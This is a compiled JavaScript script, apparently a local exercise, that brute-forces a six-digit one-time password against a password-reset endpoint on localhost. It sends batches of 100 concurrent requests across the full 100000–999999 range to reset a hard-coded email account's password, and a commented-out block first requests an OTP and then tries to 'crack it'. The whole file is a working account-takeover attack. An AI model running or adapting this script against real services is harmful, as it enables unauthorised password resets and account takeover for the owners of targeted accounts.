"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
function performRequest(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a;
        try {
            const res = yield axios_1.default.post("http://localhost:3333/reset-password", {
                email: "shoyebff45@gmail.com",
                newPassword: "new",
                otp: otp
            });
            return res.data;
        }
        catch (err) {
            return { error: ((_a = err === null || err === void 0 ? void 0 : err.response) === null || _a === void 0 ? void 0 : _a.data) || err.message };
        }
    });
}
// async function generateOtp(idx: number, num: number): Promise<void> {
//     if (idx > 6) {
//         const data = await performRequest(num);
//         console.log(`Tried OTP ${num}:`, data);
//         return;
//     }
//     for (let i = 1; i < 10; i++) {
//         await generateOtp(idx + 1, num * 10 + i);
//     }
// }
// (async () => {
//     try {
//         await axios.post(
//             "http://localhost:3333/generate-otp",
//             { email: "shoyebff45@gmail.com" },
//             {
//                 headers: {
//                     "Content-Type": "application/json"
//                 }
//             }
//         );
//         console.log("OTP generated successfully. Now trying to crack it...");
//         await generateOtp(1, 0);
//     } catch (err) {
//         console.error("Failed to generate OTP:", err);
//     }
// })();
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 100000; i <= 999999; i += 100) {
            let p = [];
            for (let j = 0; j < 100; j++) {
                console.log(i + j);
                p.push(performRequest(i + j));
            }
            yield Promise.all(p);
        }
    });
}
main();
